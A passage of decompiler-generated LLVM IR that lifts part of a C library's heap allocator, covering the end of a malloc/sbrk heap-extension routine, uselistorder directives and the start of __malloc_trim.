  store i32 %v1_8050305, i32* %eax.global-to-local, align 4
  %v2_805030a = urem i8 %v0_8050305, 2
  %v3_805030a = icmp eq i8 %v2_805030a, 0
  br i1 %v3_805030a, label %dec_label_pc_805031e, label %dec_label_pc_805030e

dec_label_pc_805030e:                             ; preds = %dec_label_pc_8050305
  br i1 %v2_805023a, label %dec_label_pc_805031e, label %dec_label_pc_8050312

dec_label_pc_8050312:                             ; preds = %dec_label_pc_805030e
  %v1_8050314 = icmp eq i1 %v7_80502ea, false
  br i1 %v1_8050314, label %dec_label_pc_805031e, label %dec_label_pc_8050316

dec_label_pc_8050316:                             ; preds = %dec_label_pc_8050312
  %v1_8050316 = and i32 %v1_8050305, -2
  %v4_8050316 = trunc i32 %v1_8050316 to i8
  store i32 %v1_8050316, i32* %eax.global-to-local, align 4
  store i8 %v4_8050316, i8* @global_var_805bd80.134, align 128
  br label %dec_label_pc_805031e

dec_label_pc_805031e:                             ; preds = %dec_label_pc_8050312, %dec_label_pc_805030e, %dec_label_pc_8050305, %dec_label_pc_8050316
  %v0_805031e = phi i8 [ %v0_8050305, %dec_label_pc_8050312 ], [ %v0_8050305, %dec_label_pc_805030e ], [ %v0_8050305, %dec_label_pc_8050305 ], [ %v4_8050316, %dec_label_pc_8050316 ]
  %v1_805031e = urem i8 %v0_805031e, 2
  %v2_805031e = icmp eq i8 %v1_805031e, 0
  br i1 %v2_805031e, label %dec_label_pc_805039c, label %dec_label_pc_8050327

dec_label_pc_8050327:                             ; preds = %dec_label_pc_805031e
  br i1 %v2_805023a, label %dec_label_pc_8050335, label %dec_label_pc_805032b

dec_label_pc_805032b:                             ; preds = %dec_label_pc_8050327
  store i32 %v2_80502ea, i32* %eax.global-to-local, align 4
  %v2_805032f = add i32 %v2_80502e2, %v2_80502ea
  store i32 %v2_805032f, i32* @global_var_805bd88.131, align 8
  br label %dec_label_pc_8050335

dec_label_pc_8050335:                             ; preds = %dec_label_pc_8050327, %dec_label_pc_805032b
  %v1_8050337 = urem i32 %v0_80503aa, 8
  %v2_8050337 = icmp eq i32 %v1_8050337, 0
  store i32 %v1_8050337, i32* %edx.global-to-local, align 4
  %v1_805033a = icmp eq i1 %v2_8050337, false
  br i1 %v1_805033a, label %dec_label_pc_8050342, label %dec_label_pc_805033c

dec_label_pc_805033c:                             ; preds = %dec_label_pc_8050335
  store i32 %v0_80503aa, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805034c

dec_label_pc_8050342:                             ; preds = %dec_label_pc_8050335
  %v2_8050347 = sub nsw i32 8, %v1_8050337
  store i32 %v2_8050347, i32* %eax.global-to-local, align 4
  %v2_8050349 = add i32 %v2_8050347, %v0_80503aa
  store i32 %v2_8050349, i32* @edi, align 4
  br label %dec_label_pc_805034c

dec_label_pc_805034c:                             ; preds = %dec_label_pc_805033c, %dec_label_pc_8050342
  %v0_8050359 = phi i32 [ 0, %dec_label_pc_805033c ], [ %v2_8050347, %dec_label_pc_8050342 ]
  %v2_805034c = add i32 %v1_80502e2, %v0_80503aa
  %v2_8050359 = add i32 %v0_8050359, %v1_805023a
  store i32 %v2_8050359, i32* %ecx.global-to-local, align 4
  %v2_805035c = add i32 %v2_8050359, %v2_805034c
  store i32 %v2_805035c, i32* %edx.global-to-local, align 4
  %v2_805035e = add i32 %v2_805035c, %v1_805014c
  %v5_8050361 = and i32 %v2_805035e, %v1_805025c
  %v2_8050368 = sub i32 %v5_8050361, %v2_805035c
  store i32 %v2_8050368, i32* %eax.global-to-local, align 4
  %v2_805036a = add i32 %v2_8050368, %v2_8050359
  store i32 %v2_805036a, i32* @esi, align 4
  store i32 %v2_805036a, i32* %stack_var_-92, align 4
  %v1_805036e = call i32 @__GI_sbrk(i32 %v2_805036a)
  store i32 %v1_805036e, i32* %eax.global-to-local, align 4
  %v10_8050376 = icmp eq i32 %v1_805036e, -1
  store i32 %v1_805036e, i32* %edx.global-to-local, align 4
  %v1_805037b = icmp eq i1 %v10_8050376, false
  br i1 %v1_805037b, label %dec_label_pc_805038b, label %dec_label_pc_805037d

dec_label_pc_805037d:                             ; preds = %dec_label_pc_805034c
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8050382 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8050382, i32* %eax.global-to-local, align 4
  store i32 %v1_8050382, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80503bf

dec_label_pc_805038b:                             ; preds = %dec_label_pc_805034c
  %v1_805038b = load i32, i32* @ebx, align 4
  %v7_805038b = icmp ult i32 %v1_805036e, %v1_805038b
  %v1_805038d = icmp eq i1 %v7_805038b, false
  br i1 %v1_805038d, label %dec_label_pc_80503c4, label %dec_label_pc_805038f

dec_label_pc_805038f:                             ; preds = %dec_label_pc_805038b
  %v0_805038f = load i8, i8* @global_var_805bd80.134, align 1
  %v2_805038f = and i8 %v0_805038f, -2
  store i8 %v2_805038f, i8* @global_var_805bd80.134, align 128
  store i32 %v2_805034c, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80503a3

dec_label_pc_805039c:                             ; preds = %dec_label_pc_805031e
  %v10_805039c = icmp eq i32 %v0_805039c, -1
  br i1 %v10_805039c, label %dec_label_pc_80503a7, label %dec_label_pc_80503a1

dec_label_pc_80503a1:                             ; preds = %dec_label_pc_805039c
  store i32 %v0_80503aa, i32* @edi, align 4
  br label %dec_label_pc_80503a3

dec_label_pc_80503a3:                             ; preds = %dec_label_pc_805038f, %dec_label_pc_80503a1
  %v0_80503c447 = phi i32 [ %v2_805034c, %dec_label_pc_805038f ], [ %v0_805039c, %dec_label_pc_80503a1 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_80503c4

dec_label_pc_80503a7:                             ; preds = %dec_label_pc_805039c
  store i32 %v0_80503aa, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_80503ae = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_80503ae, i32* %edx.global-to-local, align 4
  %v1_80503b5 = load i32, i32* @ebx, align 4
  %v2_80503b5 = sub i32 %v1_80503ae, %v1_80503b5
  %v1_80503b7 = load i32, i32* @esi, align 4
  %v2_80503b7 = sub i32 %v2_80503b5, %v1_80503b7
  store i32 %v2_80503b7, i32* %eax.global-to-local, align 4
  %v0_80503b9 = load i32, i32* @global_var_805bd88.131, align 8
  %v2_80503b9 = add i32 %v0_80503b9, %v2_80503b7
  store i32 %v2_80503b9, i32* @global_var_805bd88.131, align 8
  br label %dec_label_pc_80503bf

dec_label_pc_80503bf:                             ; preds = %dec_label_pc_805037d, %dec_label_pc_80503a7
  %v0_80503c446 = phi i32 [ %v1_8050382, %dec_label_pc_805037d ], [ %v1_80503ae, %dec_label_pc_80503a7 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_80503c4

dec_label_pc_80503c4:                             ; preds = %dec_label_pc_805038b, %dec_label_pc_80503a3, %dec_label_pc_80503bf
  %v0_80503c9 = phi i32 [ %v1_805036e, %dec_label_pc_805038b ], [ %v0_80503c447, %dec_label_pc_80503a3 ], [ %v0_80503c446, %dec_label_pc_80503bf ]
  %v10_80503c4 = icmp eq i32 %v0_80503c9, -1
  br i1 %v10_80503c4, label %dec_label_pc_8050432, label %dec_label_pc_80503c9

dec_label_pc_80503c9:                             ; preds = %dec_label_pc_80503c4
  %v1_80503c9 = load i32, i32* @edi, align 4
  %v2_80503c9 = sub i32 %v0_80503c9, %v1_80503c9
  store i32 %v2_80503c9, i32* %edx.global-to-local, align 4
  %v1_80503cb = load i32, i32* @esi, align 4
  %v2_80503cb = add i32 %v1_80503cb, %v2_80503c9
  %v1_80503ce = or i32 %v2_80503cb, 1
  store i32 %v1_80503ce, i32* %eax.global-to-local, align 4
  store i32 %v1_80503c9, i32* @global_var_805ba4c.119, align 4
  %v2_80503d7 = add i32 %v1_80503c9, 4
  %v3_80503d7 = inttoptr i32 %v2_80503d7 to i32*
  store i32 %v1_80503ce, i32* %v3_80503d7, align 4
  %v0_80503da = load i32, i32* @global_var_805bd88.131, align 8
  %v1_80503da = load i32, i32* @esi, align 4
  %v2_80503da = add i32 %v1_80503da, %v0_80503da
  store i32 %v2_80503da, i32* @global_var_805bd88.131, align 8
  br i1 %v2_805023a, label %dec_label_pc_8050432, label %dec_label_pc_80503e4

dec_label_pc_80503e4:                             ; preds = %dec_label_pc_80503c9
  store i32 %v0_805022a, i32* %ecx.global-to-local, align 4
  %v1_80503e8 = add i32 %v1_805023a, -12
  %v1_80503eb = and i32 %v1_80503e8, -8
  store i32 %v1_80503eb, i32* %eax.global-to-local, align 4
  %v1_80503f0 = or i32 %v1_80503eb, 1
  store i32 %v1_80503f0, i32* %edx.global-to-local, align 4
  %v5_80503f3 = icmp ult i32 %v1_80503eb, 15
  store i32 %v1_80503f0, i32* %v2_8050233, align 4
  %v0_80503f9 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80503f9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80503f9 = add i32 %v0_80503f9, 4
  %v3_80503f9 = add i32 %v2_80503f9, %v1_80503f9
  %v4_80503f9 = inttoptr i32 %v3_80503f9 to i32*
  store i32 5, i32* %v4_80503f9, align 4
  %v0_8050401 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050401 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050401 = add i32 %v0_8050401, 8
  %v3_8050401 = add i32 %v2_8050401, %v1_8050401
  %v4_8050401 = inttoptr i32 %v3_8050401 to i32*
  store i32 5, i32* %v4_8050401, align 4
  br i1 %v5_80503f3, label %dec_label_pc_8050432, label %dec_label_pc_805040b

dec_label_pc_805040b:                             ; preds = %dec_label_pc_80503e4
  %v0_805040b = load i32, i32* @global_var_805bd64.135, align 4
  store i32 %v0_805040b, i32* @ebx, align 4
  %v0_8050411 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050416 = add i32 %v0_8050411, 8
  store i32 %v1_8050416, i32* %eax.global-to-local, align 4
  store i32 %v1_8050416, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_805bd64.135, align 4
  %v1_8050424 = call i32 @free(i32 %v1_8050416)
  store i32 %v1_8050424, i32* %eax.global-to-local, align 4
  %v0_805042c = load i32, i32* @ebx, align 4
  store i32 %v0_805042c, i32* @global_var_805bd64.135, align 4
  br label %dec_label_pc_8050432

dec_label_pc_8050432:                             ; preds = %dec_label_pc_80503e4, %dec_label_pc_80503c9, %dec_label_pc_80503c4, %dec_label_pc_80502f3, %dec_label_pc_805040b
  %v0_8050432 = load i32, i32* @global_var_805bd88.131, align 8
  %v0_8050437 = load i32, i32* @global_var_805bd8c.136, align 4
  %v0_8050443 = load i32, i32* @global_var_805ba4c.119, align 4
  store i32 %v0_8050443, i32* @ebx, align 4
  %tmp89 = icmp ule i32 %v0_8050432, %v0_8050437
  %v5_8050449 = select i1 %tmp89, i32 %v0_8050437, i32 %v0_8050432
  store i32 %v5_8050449, i32* %edx.global-to-local, align 4
  %v1_805044c = load i32, i32* @global_var_805bd84.130, align 4
  %v2_805044c = add i32 %v1_805044c, %v0_8050432
  store i32 %v5_8050449, i32* @global_var_805bd8c.136, align 4
  %v1_8050458 = load i32, i32* @global_var_805bd94.132, align 4
  %tmp90 = icmp ule i32 %v2_805044c, %v1_8050458
  %v5_805045e = select i1 %tmp90, i32 %v1_8050458, i32 %v2_805044c
  store i32 %v5_805045e, i32* %eax.global-to-local, align 4
  store i32 %v5_805045e, i32* @global_var_805bd94.132, align 4
  %v1_805046a = add i32 %v0_8050443, 4
  %v2_805046a = inttoptr i32 %v1_805046a to i32*
  %v3_805046a = load i32, i32* %v2_805046a, align 4
  %v1_805046d = and i32 %v3_805046a, -4
  store i32 %v1_805046d, i32* %ecx.global-to-local, align 4
  %v10_8050470 = icmp ult i32 %v1_805046d, %v1_80500ea
  br i1 %v10_8050470, label %dec_label_pc_80504f0, label %dec_label_pc_8050476

dec_label_pc_8050476:                             ; preds = %dec_label_pc_8050432
  store i32 %v1_8050172, i32* %esi.global-to-local, align 4
  %v2_805047c = sub i32 %v1_805046d, %v1_8050172
  store i32 %v2_805047c, i32* %ecx.global-to-local, align 4
  %v2_805047e = add i32 %v0_8050443, %v1_8050172
  store i32 %v2_805047e, i32* %edx.global-to-local, align 4
  %v1_8050481 = or i32 %v1_8050172, 1
  store i32 %v1_8050481, i32* %eax.global-to-local, align 4
  store i32 %v2_805047e, i32* @global_var_805ba4c.119, align 4
  store i32 %v1_8050481, i32* %v2_805046a, align 4
  %v0_805048d.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805048d

dec_label_pc_805048d:                             ; preds = %dec_label_pc_80500f8, %dec_label_pc_8050476
  %v0_805048d = phi i32 [ %v5_805010b, %dec_label_pc_80500f8 ], [ %v0_805048d.pre, %dec_label_pc_8050476 ]
  %v1_805048d = or i32 %v0_805048d, 1
  store i32 %v1_805048d, i32* %ecx.global-to-local, align 4
  %v0_8050490 = load i32, i32* @ebx, align 4
  %v1_8050490 = add i32 %v0_8050490, 8
  store i32 %v1_8050490, i32* %ebx.global-to-local, align 4
  %v1_8050493 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050493 = add i32 %v1_8050493, 4
  %v3_8050493 = inttoptr i32 %v2_8050493 to i32*
  store i32 %v1_805048d, i32* %v3_8050493, align 4
  br label %dec_label_pc_80504fd

dec_label_pc_8050498:                             ; preds = %dec_label_pc_804feaa
  %v5_805049e = sub i32 %v1_804fe8d, %v1_8050172
  store i32 %v5_805049e, i32* %eax.global-to-local, align 4
  %v2_80504a2 = add i32 %v0_804ff58118, %v1_8050172
  store i32 %v2_80504a2, i32* %edx.global-to-local, align 4
  %v1_80504a6 = or i32 %v1_8050172, 1
  store i32 %v2_80504a2, i32* @global_var_805ba50.120, align 16
  store i32 %v1_80504a6, i32* %v2_804fe87, align 4
  %v0_80504b2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80504b4 = or i32 %v0_80504b2, 1
  store i32 %v1_80504b4, i32* %ecx.global-to-local, align 4
  %v0_80504b7 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80504b7, i32* @global_var_805ba5c.137, align 4
  store i32 %v0_80504b7, i32* @global_var_805ba60.122, align 32
  %v1_80504c3 = add i32 %v0_80504b7, 8
  %v2_80504c3 = inttoptr i32 %v1_80504c3 to i32*
  store i32 ptrtoint (i32* @global_var_805ba54.121 to i32), i32* %v2_80504c3, align 4
  %v0_80504ca = load i32, i32* %edx.global-to-local, align 4
  %v1_80504ca = add i32 %v0_80504ca, 12
  %v2_80504ca = inttoptr i32 %v1_80504ca to i32*
  store i32 ptrtoint (i32* @global_var_805ba54.121 to i32), i32* %v2_80504ca, align 4
  %v0_80504d1 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80504d1 = load i32, i32* %edx.global-to-local, align 4
  %v2_80504d1 = add i32 %v1_80504d1, 4
  %v3_80504d1 = inttoptr i32 %v2_80504d1 to i32*
  store i32 %v0_80504d1, i32* %v3_80504d1, align 4
  %v0_80504d4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80504d4 = load i32, i32* %edx.global-to-local, align 4
  %v3_80504d4 = add i32 %v1_80504d4, %v0_80504d4
  %v4_80504d4 = inttoptr i32 %v3_80504d4 to i32*
  store i32 %v0_80504d4, i32* %v4_80504d4, align 4
  br label %dec_label_pc_80504e2

dec_label_pc_80504d9:                             ; preds = %dec_label_pc_804feb9
  store i32 %v1_8050172, i32* %ebx.global-to-local, align 4
  %v0_80504dd = load i32, i32* @ebp, align 4
  %v2_80504dd = or i32 %v1_8050172, 4
  %v3_80504dd = add i32 %v0_80504dd, %v2_80504dd
  %v4_80504dd = inttoptr i32 %v3_80504dd to i32*
  %v5_80504dd = load i32, i32* %v4_80504dd, align 4
  %v6_80504dd = or i32 %v5_80504dd, 1
  store i32 %v6_80504dd, i32* %v4_80504dd, align 4
  br label %dec_label_pc_80504e2

dec_label_pc_80504e2:                             ; preds = %dec_label_pc_8050498, %dec_label_pc_80504d9
  %v0_80504e2 = load i32, i32* @ebp, align 4
  %v1_80504e2 = add i32 %v0_80504e2, 8
  store i32 %v1_80504e2, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80504fd

dec_label_pc_80504e7:                             ; preds = %dec_label_pc_804ffa9
  %v1_80504e7 = load i32, i32* @ebx, align 4
  %v2_80504e7 = add i32 %v0_804ffb5, 4
  %v3_80504e7 = add i32 %v2_80504e7, %v1_80504e7
  %v4_80504e7 = inttoptr i32 %v3_80504e7 to i32*
  %v5_80504e7 = load i32, i32* %v4_80504e7, align 4
  %v6_80504e7 = or i32 %v5_80504e7, 1
  store i32 %v6_80504e7, i32* %v4_80504e7, align 4
  br label %dec_label_pc_80504ec

dec_label_pc_80504ec:                             ; preds = %dec_label_pc_804ffc1, %dec_label_pc_80504e7
  %v0_80504ec = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_80504ec, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80504fd

dec_label_pc_80504f0:                             ; preds = %dec_label_pc_8050293, %dec_label_pc_8050432, %dec_label_pc_80502d5, %dec_label_pc_80502ab
  %v0_80504f0 = load i32, i32* %stack_var_-92, align 4
  %v1_80504f0 = call i32 @__errno_location(i32 %v0_80504f0)
  store i32 %v1_80504f0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_80504f7 = inttoptr i32 %v1_80504f0 to i32*
  store i32 12, i32* %v1_80504f7, align 4
  br label %dec_label_pc_80504fd

dec_label_pc_80504fd:                             ; preds = %dec_label_pc_80504ec, %dec_label_pc_80504e2, %dec_label_pc_805048d, %dec_label_pc_8050123, %dec_label_pc_80500d5, %dec_label_pc_804fe54, %dec_label_pc_80504f0
  store i32 %v2_804fd8b, i32* @eax, align 4
  store i32 %v2_804fd8b, i32* %stack_var_-92, align 4
  %v2_8050506 = call i32 @__pthread_return_void(i32 %v2_804fd8b, i32 1)
  store i32 %v2_8050506, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805050e

dec_label_pc_805050e:                             ; preds = %dec_label_pc_804fda9, %dec_label_pc_80504fd
  %v0_8050511 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050511, i32* %eax.global-to-local, align 4
  %v2_8050513 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050513, i32* @ebx, align 4
  store i32 %v0_804fd78, i32* @esi, align 4
  store i32 %v0_804fd77, i32* @edi, align 4
  store i32 %v0_804fd76, i32* @ebp, align 4
  ret i32 %v0_8050511

; uselistorder directives
  uselistorder i32 %v0_80504d4, { 1, 0 }
  uselistorder i32 %v1_8050458, { 1, 0 }
  uselistorder i32 %v2_805044c, { 1, 0 }
  uselistorder i32 %v0_8050437, { 1, 0 }
  uselistorder i32 %v0_8050432, { 0, 2, 1 }
  uselistorder i32 %v1_80503c9, { 1, 0, 2 }
  uselistorder i32 %v0_80503c9, { 1, 0 }
  uselistorder i32 %v2_80503b7, { 1, 0 }
  uselistorder i32 %v1_805036e, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_805035c, { 1, 0, 2 }
  uselistorder i32 %v2_805034c, { 1, 2, 0 }
  uselistorder i32 %v2_8050347, { 1, 0, 2 }
  uselistorder i32 %v1_8050337, { 2, 1, 0 }
  uselistorder i8 %v0_8050305, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_80502e8, { 1, 0, 2 }
  uselistorder i32 %v0_80503aa, { 4, 5, 2, 3, 6, 1, 8, 7, 0 }
  uselistorder i32 %v0_805039c, { 2, 0, 1 }
  uselistorder i32 %v8_80502b8, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v5_805029e, { 1, 0, 2 }
  uselistorder i32 %v3_805029e, { 1, 0 }
  uselistorder i32 %v1_805026c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8050260, { 2, 1, 0, 3 }
  uselistorder i32 %v1_805025c, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_805024a, { 1, 0 }
  uselistorder i32 %v1_805023a, { 5, 1, 2, 3, 4, 0, 6, 7 }
  uselistorder i32 %v0_805022a, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v1_8050213, { 1, 0 }
  uselistorder i32 %v2_8050207, { 1, 0 }
  uselistorder i32 %v2_80501f7, { 0, 3, 1, 2 }
  uselistorder i32 %v2_80501db, { 1, 2, 0 }
  uselistorder i32 %v1_80501db, { 1, 0, 2 }
  uselistorder i32 %v1_80501da, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_80501d4, { 1, 0 }
  uselistorder i32 %v2_80501b2, { 1, 2, 0, 3 }
  uselistorder i32 %v1_80501a6, { 2, 1, 0 }
  uselistorder i32 %v8_8050191, { 4, 3, 2, 1, 5, 0, 6 }
  uselistorder i32 %v2_8050178, { 1, 0, 2 }
  uselistorder i32 %v0_805011b, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_80500ea, { 2, 0, 1, 3 }
  uselistorder i32 %v0_80500dd, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_80500c3, { 1, 0, 2 }
  uselistorder i32 %v1_805005d, { 1, 0 }
  uselistorder i32 %v3_8050052, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_805004c, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_805004912, { 1, 0 }
  uselistorder i32 %v2_805003e, { 1, 0 }
  uselistorder i32 %v1_8050022, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_805001e, { 2, 1, 0 }
  uselistorder i32 %v1_805001a, { 1, 0 }
  uselistorder i32 %v1_8050015, { 2, 1, 0 }
  uselistorder i32 %v2_8050004, { 1, 0 }
  uselistorder i32 %v1_8050001, { 1, 2, 0, 3 }
  uselistorder i32 %v4_804ff9f, { 2, 6, 4, 5, 3, 1, 0 }
  uselistorder i32 %v0_804ffea, { 1, 0 }
  uselistorder i32 %v0_804ffb5, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804ff8b, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804ff58, { 0, 2, 1 }
  uselistorder i32 %v2_804ff3c, { 1, 0 }
  uselistorder i32 %v1_804ff32, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_804ff2d.lcssa, { 1, 0 }
  uselistorder i32 %v3_804ff1d, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_804ff14, { 1, 0, 2 }
  uselistorder i32 %v3_804fef7, { 5, 1, 2, 3, 4, 6, 0, 7 }
  uselistorder i32 %v2_804fef0, { 1, 0, 2 }
  uselistorder i32 %v2_804fed8, { 2, 1, 0 }
  uselistorder i32 %v0_804fec4, { 2, 1, 3, 0 }
  uselistorder i32 %v3_804fe8a, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804ff58118, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804ff58109, { 1, 0, 2 }
  uselistorder i32 %v3_804fe37, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804fe29, { 2, 1, 0 }
  uselistorder i32 %v2_804fe04, { 2, 1, 0 }
  uselistorder i8 %v0_804fdd2, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_8050172, { 13, 32, 11, 5, 30, 12, 6, 23, 22, 2, 1, 7, 25, 24, 21, 19, 20, 8, 27, 26, 28, 9, 29, 16, 10, 17, 18, 0, 31, 14, 15, 3, 33, 35, 34, 4, 36 }
  uselistorder i32 %v1_804fdbb, { 1, 2, 0 }
  uselistorder i32 %v0_804fda4, { 1, 0 }
  uselistorder i32 %v2_804fd8b, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 21, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45 }
  uselistorder i32* %ecx.global-to-local, { 27, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder i32* %ebx.global-to-local, { 23, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 0, 12, 13, 15, 16, 17, 18, 1, 21, 22, 24, 19, 20 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 54, 49, 50, 53, 52, 51, 55, 56, 57, 61, 62, 64, 63, 65, 66, 67, 68, 69, 70, 71, 72, 73, 0, 58, 59, 60 }
  uselistorder i32 (i32)* @free, { 1, 5, 4, 3, 2, 0 }
  uselistorder i8 -2, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i8* @global_var_805bd80.134, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32)* @malloc, { 1, 10, 9, 8, 3, 7, 6, 5, 4, 2, 0 }
  uselistorder i32 134593108, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_805ba60.122, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_805ba4c.119 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_805ba4c.119 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_805050e, { 1, 0 }
  uselistorder label %dec_label_pc_80504fd, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_80504f0, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_80504ec, { 1, 0 }
  uselistorder label %dec_label_pc_80504e2, { 1, 0 }
  uselistorder label %dec_label_pc_805048d, { 1, 0 }
  uselistorder label %dec_label_pc_8050432, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80503c4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80503bf, { 1, 0 }
  uselistorder label %dec_label_pc_80503a3, { 1, 0 }
  uselistorder label %dec_label_pc_805034c, { 1, 0 }
  uselistorder label %dec_label_pc_8050335, { 1, 0 }
  uselistorder label %dec_label_pc_805031e, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80502d5, { 1, 0 }
  uselistorder label %dec_label_pc_8050293, { 1, 0 }
  uselistorder label %dec_label_pc_805022a, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80501c9, { 1, 0 }
  uselistorder label %dec_label_pc_80500dd, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80500d5, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050049, { 1, 0 }
  uselistorder label %dec_label_pc_805004e.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8050022, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ffa9, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_804ff30, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804ff19, { 1, 0 }
  uselistorder label %dec_label_pc_804fe87, { 1, 0 }
  uselistorder label %dec_label_pc_804ff58.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804fe54, { 1, 0 }
  uselistorder label %dec_label_pc_804fdd2, { 1, 0 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_8050519 = load i32, i32* @edx, align 4
  store i32 %v0_8050519, i32* %ebp.global-to-local, align 4
  %v0_805051c = load i32, i32* @esi, align 4
  %v1_8050521 = add i32 %v0_8050519, 860
  %v2_8050521 = inttoptr i32 %v1_8050521 to i32*
  %v3_8050521 = load i32, i32* %v2_8050521, align 4
  store i32 %v3_8050521, i32* @ecx, align 4
  %v1_8050527 = add i32 %v0_8050519, 44
  %v2_8050527 = inttoptr i32 %v1_8050527 to i32*
  %v3_8050527 = load i32, i32* %v2_8050527, align 4
  %v1_805052a = add i32 %v3_8050527, 4
  %v2_805052a = inttoptr i32 %v1_805052a to i32*
  %v3_805052a = load i32, i32* %v2_805052a, align 4
  %v1_805052d = and i32 %v3_805052a, -4
  store i32 %v1_805052d, i32* @esi, align 4
  %v1_8050532 = load i32, i32* @eax, align 4
  %v2_8050532 = add i32 %v3_8050521, -17
  %v2_8050534 = add i32 %v2_8050532, %v1_805052d
  %v3_8050534 = sub i32 %v2_8050534, %v1_8050532
  %div = udiv i32 %v3_8050534, %v3_8050521
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_8050534, %v3_8050521
  store i32 %tmp10, i32* @edx, align 4
  %v1_805053c = add i32 %div, -1
  %v4_805053f = mul i32 %v1_805053c, %v3_8050521
  store i32 %v4_805053f, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_805053f, 1
  br i1 %tmp11, label %dec_label_pc_805059b, label %dec_label_pc_8050546
